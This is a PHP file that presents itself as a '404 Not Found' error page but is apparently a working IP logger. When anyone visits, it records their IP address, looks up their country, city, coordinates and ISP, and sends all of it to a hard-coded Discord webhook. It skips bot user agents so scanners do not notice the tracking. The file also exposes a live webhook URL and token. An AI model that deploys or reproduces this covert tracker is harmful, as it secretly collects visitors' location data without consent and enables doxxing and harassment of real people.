<?php

if(!empty($_SERVER['HTTP_CLIENT_IP'])){
    $USERIP=$_SERVER['HTTP_CLIENT_IP'];
  }
  elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
    $USERIP=$_SERVER['HTTP_X_FORWARDED_FOR'];
  }
  else{
    $USERIP=$_SERVER['REMOTE_ADDR'];
  }

$Broseraaa = $_SERVER["HTTP_USER_AGENT"];

//stolen, this prevents bot ips
if(preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $Broseraaa)) {
    exit();
}

// jhelloo fututure sakml

//Okay, so first time using php.

// initialize curl(what is curl? don't even know but I know it allows me to process data from an api)
$curl = curl_init();
echo $USERIP;
$curl = curl_init("http://ip-api.com/json/$USERIP"); //Get the info of the IP using Curl
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

//actually exectuting it shit cuh
$resp = curl_exec($curl);
//shit cujj

//catches error and returns it( probably should remove if I actually use logger )
if($e = curl_error($curl)) {
    echo $e;
}
else {
    //if no error- set user_info to response
    $data = json_decode(curl_exec($curl));
}
//ALWAYS close curl!111
curl_close($curl);
$COUNTRY = $data->country;
$REGIONNAME = $data->regionName;
$CITY = $data->city;
$LAT = $data->lat;
$LON = $data->lon;
$IP = $data->query;
$ISP = $data->isp;
$TIMESTAMP = date("Y/m/d || h:ia + s");

$url = "https://discord.com/api/webhooks/945454026399555664/F57zknNVeVjpJPrb6WF1Tg0ksa-naTdWnR6o0Xl-vMQ7HZ5zSCc9D4Bbv9ZUn_aRevw9";
$headers = [ 'Content-Type: application/json; charset=utf-8' ];
$POST = [ 
    "embeds" => [
        [
            "title" => "LEAN LOGGER DID IT AGAIN BROTHER",
            "fields" => 
            [
                [
                    "name" => "Country: ",
                    "value" => "$COUNTRY",
                    "inline" => false
                ],
                [
                    "name" => "Region: ",
                    "value" => "$REGIONNAME",
                    "inline" => false
                ],
                [
                    "name" => "City: ",
                    "value" => "$CITY",
                    "inline" => false
                ],
                [
                    "name" => "Cordinates: ",
                    "value" => "$LAT, $LON",
                    "inline" => false
                ],
                [
                    "name" => "IP: ",
                    "value" => "$IP",
                    "inline" => false
                ],
                [
                    "name" => "ISP: ",
                    "value" => "$ISP",
                    "inline" => false
                ],
                [
                    "name" => "Date: ",
                    "value" => "$TIMESTAMP seconds",
                    "inline" => false
                ]
            ]
        ]
    ]
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
$response = curl_exec($ch);
?>

<!-- stolen 404 page -->
<!DOCTYPE html>
<html lang="en"> 

<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>404 Not Found</title>
    <style type="text/css">
    .page {
        display: -webkit-box;
        display: -ms-flexbox;
        display: flex;
        min-height: 100vh;
    }

    .main {
        -webkit-box-flex: 1;
        -ms-flex: 1 1 70%;
        flex: 1 1 70%;
        box-sizing: border-box;
        padding: 10rem 5rem 5rem;
        min-height: 100vh;
    }

    .error-code {
        color: #f47755;
        font-size: 8rem;
        line-height: 1;
    }

    p.lead {
        font-size: 1.6rem;
        color: #4f5a64;
    }
    </style>
</head>

<body>
    

    <div class="page">
        <div class="main">
            <h1>Server Error</h1>
            <div class="error-code">404</div>
            <h2>Page Not Found</h2>
            <p class="lead">This page either doesn't exist, or it moved somewhere else.</p>
            <hr />
        </div>
</body>